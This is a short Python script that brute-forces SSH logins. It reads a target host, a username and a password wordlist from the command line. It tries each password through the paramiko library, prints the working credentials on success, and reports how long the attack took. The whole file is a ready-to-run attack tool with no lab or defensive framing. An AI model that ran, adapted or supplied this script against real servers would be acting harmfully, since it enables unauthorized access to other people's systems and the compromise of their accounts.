#!/usr/bin/env python
import sys, os, socket
from datetime import datetime
# foreign dependency for ssh capability
import paramiko

global host, username, line

OKGREEN = '\033[92m'
FAIL = '\033[91m'
ENDC = '\033[0m'
ERROR = FAIL+"ERROR: "+ENDC

line = "\n--------------------------------------------------------------\n"

# attempts to connect to ssh with supplied password
def ssh_connect(password, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username,password=password)
    except paramiko.AuthenticationException:
        # Auth failed
        code = 1
    except socket.error:
        # Connection failed
        code = 2

    ssh.close()
    return code

# attempts to brute force an ssh connection given a text file containing a list
# of passwords.
def brute_force(username, host, passwords_file):
    print(line+"Starting brute force..."+line)
    t1 = datetime.now()
    passwords_file = open(passwords_file)

    print("")

    for i in passwords_file.readlines():
        password = i.strip("\n")
        try:
            resp = ssh_connect(password)

            if(resp == 0):
                print(OKGREEN+line+"[*] SUCCESS [*] User: "+username+
                " [*] Pass: "+password+ENDC )
                sys.exit(0)
            elif(resp == 1):
                print(FAIL+"[*] User: "+username+" [*] Pass:"+password+
                " => FAILED"+ENDC)
            elif(resp == 2):
                print(FAIL+"NO CONNECTION TO "+host+ENDC)
        except Exception as e:
            print(ERROR+" exception.")
            print(e)
            pass

    passwords_file.close()
    t2 = datetime.now()
    total =  t2 - t1
    print('Attack Duration: ', total)

if __name__== "__main__":
    try:
        host = sys.argv[1]
        username = sys.argv[2]
        passwords_file = sys.argv[3]

        if os.path.exists(passwords_file) == False:
            print(ERROR+" file does not exist.")
            sys.exit(4)

        brute_force(username,host,passwords_file)
    except (IndexError):
        print(ERROR+" incorrect arguments.")
        print("Usage: ssh_bruteforce [host_ip] [username] [password_list]")

    except (KeyboardInterrupt):
        print("You pressed CTRL+C")
        sys.exit(3)
